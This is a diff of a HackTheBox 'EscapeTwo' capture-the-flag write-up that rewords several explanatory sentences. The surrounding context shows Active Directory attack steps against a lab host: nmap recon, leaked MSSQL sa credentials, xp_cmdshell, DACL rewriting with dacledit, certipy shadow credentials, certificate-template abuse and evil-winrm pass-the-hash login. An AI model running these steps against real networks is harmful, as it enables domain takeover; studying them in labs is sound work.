@@ -44,7 +44,7 @@ remediation:
 
 ::: stage n=1 label="RECON" title="Default creds open the front door."
 
-`rose / [REDACTED]` are the provided credentials. Nmap confirms a full AD stack: DNS, Kerberos, LDAP (389/3268), SMB, RPC over HTTP, MSSQL 2019, WinRM.
+`rose / [REDACTED]` are the provided credentials. Nmap shows the AD services: DNS, Kerberos, LDAP (389/3268), SMB, RPC over HTTP, MSSQL 2019, WinRM.
 
 ::: terminal title="shell · operator@kali" lang="bash"
 $ nmap -A -T5 -oN nmap.txt 10.10.11.51 --min-rate 2000
@@ -84,7 +84,7 @@ $ cat accounts/xl/sharedStrings.xml
 <t>MSSQL@somelongstring...</t>
 :::
 
-The most interesting leak is {red:sa@sequel.htb}, the MSSQL `sa` login.
+The spreadsheet also contains {red:sa@sequel.htb}, the MSSQL `sa` login.
 
 ::: img src="../assets/img/writeups/htb-escapetwo/02-xlsx-xml.png" caption="accounts.xlsx is just a zip — sharedStrings.xml leaks sa@sequel.htb"
 
@@ -104,7 +104,7 @@ SAPWD="[REDACTED]"
 
 ::: img src="../assets/img/writeups/htb-escapetwo/03-mssqlclient.png" caption="mssqlclient as sa — xp_cmdshell prints the config INI with the old sql_svc password"
 
-Not a current-password match, but the exposed `sql_svc` password is the seed for a password spray.
+The exposed `sql_svc` password is not current, but it can be used in a password spray.
 
 :::
 
@@ -141,7 +141,7 @@ $ dacledit.py -action write -rights FullControl \
 [*] DACL modified successfully!
 :::
 
-Shadow-credential the `ca_svc` account to get its NT hash:
+Use shadow credentials on `ca_svc` to get its NT hash:
 
 ::: terminal title="shell · ryan · certipy" lang="bash"
 $ certipy-ad shadow auto -u 'ryan@sequel.htb' -p '[REDACTED]' -account ca_svc
@@ -181,7 +181,7 @@ $ evil-winrm -i 10.10.11.51 -u administrator -H [NT HASH]
 :::
 
 ::: tip
-ADCS ESC-style abuse keeps working because admins rarely audit certificate templates. If `certipy find --vulnerable` returns *anything* in a lab or pentest, expect trouble in prod too.
+The certificate template lets us request a certificate as Administrator after gaining control of `ca_svc`.
 :::
 
 :::
